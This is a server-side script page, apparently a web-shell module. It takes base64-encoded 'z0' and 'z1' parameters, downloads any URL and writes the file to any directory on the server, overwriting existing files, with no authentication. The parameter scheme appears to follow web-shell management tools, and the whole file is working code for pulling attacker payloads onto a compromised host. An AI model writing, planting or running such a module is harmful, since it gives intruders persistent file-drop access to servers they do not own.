<%
(function() {
    response.setContentType("application/json");
    response.setCharacterEncoding("UTF-8");

    var URL = java.net.URL;
    var Paths = java.nio.file.Paths;
    var Files = java.nio.file.Files;
    var StandardCopyOption = java.nio.file.StandardCopyOption;

    function outputJson(obj) {
        var jsonStr = JSON.stringify(obj);
        if (typeof echo === 'function') {
            echo(jsonStr);
        } else {
            out.print(jsonStr);
        }
    }

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    var urlStr = base64_decode(request.getParameter("z0"));
    var saveDirStr = base64_decode(request.getParameter("z1"));

    if (!urlStr || !saveDirStr) {
        outputJson({ success: false, error: 'Missing parameters' });
        return;
    }

    try {
        var url = new URL(urlStr);
        var conn = url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);
        conn.setInstanceFollowRedirects(true);

        var responseCode = conn.getResponseCode();
        if (responseCode < 200 || responseCode >= 400) {
            outputJson({ success: false, error: 'Download failed with HTTP ' + responseCode });
            return;
        }

        var filename = null;

        var contentDisposition = conn.getHeaderField("Content-Disposition");
        if (contentDisposition != null) {
            var match = /filename=\x22?([^\x22\x3b\n]+)\x22?/i.exec(contentDisposition);
            if (match && match[1]) {
                filename = match[1].trim();
            }
        }

        if (!filename) {
            var pathStr = url.getPath();
            if (pathStr) {
                var index = pathStr.lastIndexOf('/');
                if (index !== -1) {
                    filename = pathStr.substring(index + 1);
                }
            }
        }

        if (!filename || filename === "" || filename === "/") {
            filename = "download.bin";
        }

        var saveDir = Paths.get(saveDirStr);
        if (!Files.exists(saveDir)) {
            Files.createDirectories(saveDir);
        }
        var filePath = saveDir.resolve(filename);

        var is = conn.getInputStream();
        Files.copy(is, filePath, StandardCopyOption.REPLACE_EXISTING);
        is.close();
        conn.disconnect();

        outputJson({
            success: true,
            filename: filename,
            path: filePath.toAbsolutePath().toString()
        });

    } catch (e) {
        outputJson({
            success: false,
            error: 'Download failed: ' + e.toString()
        });
    }
})();
%>